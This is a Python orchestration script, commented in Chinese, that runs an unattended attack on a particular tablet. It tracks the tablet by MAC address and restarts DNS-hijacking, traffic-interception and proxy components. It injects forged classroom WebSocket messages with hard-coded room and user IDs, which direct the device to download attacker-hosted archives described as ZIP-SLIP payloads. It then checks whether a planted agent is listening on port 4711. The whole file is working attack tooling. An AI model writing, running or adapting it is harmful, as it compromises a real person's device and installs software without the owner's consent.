# -*- coding: utf-8 -*-
"""supervisor.py - 无人值守中枢(自愈 + 自触发 + 自推进)。

职责:
  1) 自愈: 每 30s 检查并拉起全部组件(numpy/环境/PYTHONPATH 正确), 死了就重启
  2) 跟随平板: 按 MAC 解析平板 IP; IP 变化时自动重启 npcap_http80 / ws8889 / dns_hijack
  3) 自触发: 监视 ws8889 的 accept= 行 => 一旦捕捉到新 WS 握手, 自动打全套注入(50001+短语+任务+事件)
  4) 自推进: 监视命中(ZIP-SLIP 载荷下发 / 18080 平板请求 / 4711 上线) => 记录并继续推进
  5) 兜底: 热点消失 => 用 WinRT 重新开启

输出: supervisor.log / supervisor_hits.log
"""
import io
import json
import os
import re
import socket
import subprocess
import time

BASE = os.path.dirname(os.path.abspath(__file__))
LOG = os.path.join(BASE, "supervisor.log")
HITS = os.path.join(BASE, "supervisor_hits.log")
PAD_MAC = "80:20:fd:8b:4b:fa"
PAD_MAC_DASH = "80-20-fd-8b-4b-fa"
OUR = "192.168.137.1"
ROOM = "UXHOVJJF"
UID = "2112229"
PYW = r"D:\Program Files\Tencent\Marvis\MarvisAgent\1.60.3000.716\runtime\python311\pythonw.exe"
PYS = r"D:\Program Files\Tencent\Marvis\MarvisAgent\1.60.3000.716\runtime\python311\python.exe"

# 需要常驻的组件(脚本名, 参数)
COMPONENTS = [
    ("npcap_http80.py", ["86400"]),
    ("ws8889.py", ["86400"]),
    ("dns_hijack.py", []),
    ("proxy8888.py", []),
    ("cloud_api.py", []),
    ("tls_passthrough.py", []),
    ("watch_chain.py", []),
    ("hotspot_watch.py", []),
    ("ws_autoburst.py", []),
]
NEEDS_PAD = {"npcap_http80.py", "ws8889.py", "dns_hijack.py"}


def w(m, hit=False):
    line = "%s %s" % (time.strftime("%m-%d %H:%M:%S"), m)
    try:
        with io.open(LOG, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass
    if hit:
        try:
            with io.open(HITS, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except Exception:
            pass
    print(line, flush=True)


def sh(cmd, t=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        return "ERR %r" % (e,)


def tail(p, n=300):
    try:
        with io.open(p, encoding="utf-8", errors="replace") as f:
            return f.readlines()[-n:]
    except Exception:
        return []


def pad_ip():
    out = sh("arp -a")
    for ln in out.splitlines():
        if PAD_MAC_DASH in ln.lower():
            m = re.match(r"\s*([0-9.]+)", ln)
            if m:
                return m.group(1)
    return ""


def gw_up():
    return "True" in sh('powershell -NoProfile -Command "(Test-Connection 192.168.137.1 -Count 1 -Quiet)"', 25)


def hotspot_on():
    code = ("[Windows.Networking.NetworkOperators.NetworkOperatorTetheringManager,"
            "Windows.Networking.NetworkOperators,ContentType=WindowsRuntime]|Out-Null;"
            "$c=[Windows.Networking.Connectivity.NetworkInformation,"
            "Windows.Networking.Connectivity,ContentType=WindowsRuntime]::GetInternetConnectionProfile();"
            "$m=[Windows.Networking.NetworkOperators.NetworkOperatorTetheringManager]::CreateFromConnectionProfile($c);"
            "try{$m.StartTetheringAsync()|Out-Null}catch{}")
    return sh('powershell -NoProfile -Command "%s"' % code, 40)


def port_open(ip, port, t=0.4):
    s = socket.socket()
    s.settimeout(t)
    try:
        s.connect((ip, port))
        return True
    except Exception:
        return False
    finally:
        try:
            s.close()
        except Exception:
            pass


def running(script):
    out = sh('powershell -NoProfile -Command "(Get-CimInstance Win32_Process | '
             "Where-Object { $_.CommandLine -match '%s' } | Measure-Object).Count\"" % script.replace(".", "\\."), 25)
    m = re.search(r"(\d+)", out)
    return int(m.group(1)) if m else 0


def start(script, args=None):
    env = "set PYTHONIOENCODING=utf-8&& set PYTHONPATH=%s\\pylibs&& set WS8889_ONLY_DST=*&& set DNS_IFINDEX=13&& " % BASE
    cmd = '%scmd /c start "" /B "%s" "%s\\%s" %s' % (env, PYW, BASE, script, " ".join(args or []))
    sh(cmd, 20)


def frame(mtype, data, cid, tag, cmd=2):
    return json.dumps({
        "cId": cid, "cmd": cmd, "from": "10001", "gt": 0, "id": "1349658", "rt": 1,
        "smsg": {"classRoomId": ROOM, "createTag": tag, "data": data,
                 "forward": 0, "senderId": 0, "type": mtype, "userIds": UID},
        "tags": ["RWYZKUIF"]}, ensure_ascii=False)


def burst(seq):
    inj = os.path.join(BASE, "ws_inject.txt")
    steps = [
        ("50001", frame(50001, json.dumps({"port": 80, "hostName": OUR, "rootPath": "/xh",
                                           "downloadWaitTime": 0, "startLimitRate": 1.0}), "179A%02d1" % seq, "default_tag")),
        ("type=3 a.7z", frame(3, json.dumps({"voiceId": "sa%d" % seq, "voiceUrl": "http://%s:80/sa%d.7z" % (OUR, seq)}), "179A%02d2" % seq, "canvas_tag")),
        ("type=6", frame(6, "ws://%s:8890" % OUR, "179A%02d3" % seq, "canvas_tag")),
        ("50001-2", frame(50001, json.dumps({"port": 80, "hostName": OUR, "rootPath": "/x2",
                                            "downloadWaitTime": 0, "startLimitRate": 1.0}), "179A%02d4" % seq, "default_tag")),
        ("type=3 b.zip", frame(3, json.dumps({"voiceId": "sb%d" % seq, "voiceUrl": "http://%s:80/sb%d.zip" % (OUR, seq)}), "179A%02d5" % seq, "canvas_tag")),
        ("cmd=11", frame(0, "", "179A%02d6" % seq, "default_tag", cmd=11)),
        ("20003", frame(20003, "", "179A%02d7" % seq, "server_tag")),
        ("20005", frame(20005, json.dumps({"id": "1349658", "answerName": "t",
                                           "imgUrl": "http://%s:80/s%d.png" % (OUR, seq),
                                           "paintUrl": "http://%s:80/s%d.txt" % (OUR, seq)}), "179A%02d8" % seq, "server_tag")),
    ]
    for name, js in steps:
        try:
            with io.open(inj, "w", encoding="utf-8") as f:
                f.write(js)
            w("  burst -> %s" % name)
        except Exception as e:
            w("  burst err %r" % (e,))
        time.sleep(5)


if __name__ == "__main__":
    w("===== supervisor start =====")
    seen = set()
    for ln in tail(os.path.join(BASE, "ws8889.log"), 500):
        if "accept=" in ln:
            seen.add(ln.split()[-1])
    last_pad = ""
    seq = 0
    tick = 0
    while True:
        tick += 1
        try:
            # 1) 热点自愈
            if not gw_up():
                w("!! 热点不可达 => 重新开启")
                hotspot_on()
                time.sleep(10)
            # 2) 平板 IP
            pad = pad_ip()
            if pad and pad != last_pad:
                w("平板 IP = %s (变化: %s->%s)" % (pad, last_pad or "-", pad))
                last_pad = pad
                # 3) 需要 pad 的组件重启以锁定新 IP
                for script, _ in COMPONENTS:
                    if script in NEEDS_PAD:
                        sh('powershell -NoProfile -Command "Get-CimInstance Win32_Process | '
                           "Where-Object { $_.CommandLine -match '%s' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }\"" % script.replace(".", "\\."), 25)
                time.sleep(4)
            # 4) 组件自愈
            for script, args in COMPONENTS:
                if running(script) == 0:
                    w("组件缺失 => 启动 %s" % script)
                    start(script, args)
                    time.sleep(3)
            # 5) 自触发: 新握手 => 打全套注入
            for ln in tail(os.path.join(BASE, "ws8889.log"), 200):
                if "accept=" in ln:
                    key = ln.strip().split()[-1]
                    if key not in seen:
                        seen.add(key)
                        seq += 1
                        w("★★★ 捕捉到新 WS 握手(#%d) => 自动注入" % seq, hit=True)
                        time.sleep(3)
                        burst(seq)
            # 6) 自推进: 命中监测
            nh = tail(os.path.join(BASE, "npcap_http80.log"), 300)
            s2 = sum(1 for l in nh if "PAYLOAD-SERVE2" in l)
            for l in nh:
                if "HIGH-VALUE-RESOURCE" in l and ("/xh/" in l or "ztktv4" in l):
                    w("★ 劫持命中: %s" % l.strip()[:180], hit=True)
            for l in tail(os.path.join(BASE, "proxy8888.log"), 60):
                m = re.search(r"'req': (\d+)", l)
                if m and int(m.group(1)) > 0 and "127.0.0.1" not in l:
                    w("★ 代理命中(端侧走我们代理): %s" % l.strip()[:180], hit=True)
            if pad and port_open(pad, 4711):
                w("!!!!!! 4711 上线 => agent 已装并运行", hit=True)
            if tick % 10 == 0:
                w("[stat] pad=%s gw=%s 组件=%s" % (
                    pad or "-", gw_up(),
                    {s: running(s) for s, _ in COMPONENTS}))
        except Exception as e:
            w("loop err %r" % (e,))
        time.sleep(30)
